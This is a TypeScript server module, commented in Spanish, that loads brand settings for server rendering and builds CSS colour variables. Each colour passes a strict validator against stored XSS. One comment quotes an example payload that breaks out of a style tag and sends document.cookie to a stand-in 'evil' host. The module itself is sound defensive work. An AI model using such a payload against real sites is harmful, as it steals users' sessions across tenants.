import "server-only";
import { PlatformSettingsDB } from "@/lib/db/platform-settings.db";
import {
  PLATFORM_CONFIG_DEFAULTS,
  PLATFORM_CONFIG_KEYS,
  flatToNested,
  type PlatformConfig,
} from "@/lib/platform-config";

/**
 * lib/platform-config.server.ts — fetch del PlatformConfig en server
 * components (root layout, páginas SSR). Reusa el cache de
 * PlatformSettingsDB.getAll() (5 min) — no agregamos otro layer.
 *
 * Brandon mayo 2026: el root layout llama esta función para inyectar
 * los colores y el nombre de marca antes del primer paint, evitando
 * el flash de "verde Buleje default" cuando el cliente cambió a su
 * propia paleta.
 */
export async function getPlatformConfigSSR(): Promise<PlatformConfig> {
  try {
    const all = await PlatformSettingsDB.getAll();
    const flat: Record<string, unknown> = {};
    for (const k of Object.keys(PLATFORM_CONFIG_KEYS)) {
      if (k in all) flat[k] = all[k];
    }
    return flatToNested(flat);
  } catch {
    // Si la DB no responde, defaults — el sitio sigue funcionando con la
    // identidad por defecto de Buleje. Mejor degradar que romper.
    return PLATFORM_CONFIG_DEFAULTS;
  }
}

/**
 * Round 22 P1 (Security Pentester): pre-validador estricto de color CSS.
 * Antes el `cfg.brand.primaryColor` se interpolaba directo dentro de un
 * `<style dangerouslySetInnerHTML>` global → un superadmin malicioso podía
 * inyectar `red;}</style><script>fetch('//evil/'+document.cookie)</script>`
 * y comprometer TODOS los tenants en cada request.
 *
 * Acepta solo formatos seguros:
 *   - hex 3/4/6/8 dígitos: #abc, #abcd, #aabbcc, #aabbcc88
 *   - rgb()/rgba() con números enteros + alpha decimal opcional
 *   - hsl()/hsla() con grados + %
 * Rechaza cualquier cosa con `;`, `}`, `<`, `>`, comillas o llaves.
 */
const COLOR_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\(\s*\d+\s*,\s*\d+\s*,\s*\d+(?:\s*,\s*[\d.]+)?\s*\)|hsla?\(\s*\d+\s*,\s*\d+%?\s*,\s*\d+%?(?:\s*,\s*[\d.]+)?\s*\))$/;

function safeColor(value: string | null | undefined): string | null {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  if (!COLOR_RE.test(trimmed)) return null;
  return trimmed;
}

/**
 * Devuelve un bloque CSS `:root` con los CSS vars de marca aplicados.
 * Inyectar en `<head>` o al inicio de `<body>` para evitar FOUC.
 *
 * Sólo emite vars cuyos valores difieran del default — así no
 * sobreescribimos los tokens del DS si el cliente todavía no
 * configuró nada. Round 22: cada valor pasa por safeColor() antes
 * de interpolarse — rechaza payloads de stored XSS.
 */
export function brandColorOverridesCss(cfg: PlatformConfig): string | null {
  const overrides: string[] = [];
  const primary = safeColor(cfg.brand.primaryColor);
  if (primary && primary !== PLATFORM_CONFIG_DEFAULTS.brand.primaryColor) {
    overrides.push(`--brand-primary: ${primary};`);
    overrides.push(`--accent: ${primary};`);
  }
  const secondary = safeColor(cfg.brand.secondaryColor);
  if (secondary && secondary !== PLATFORM_CONFIG_DEFAULTS.brand.secondaryColor) {
    overrides.push(`--brand-secondary: ${secondary};`);
  }
  if (overrides.length === 0) return null;
  return `:root{${overrides.join("")}}`;
}
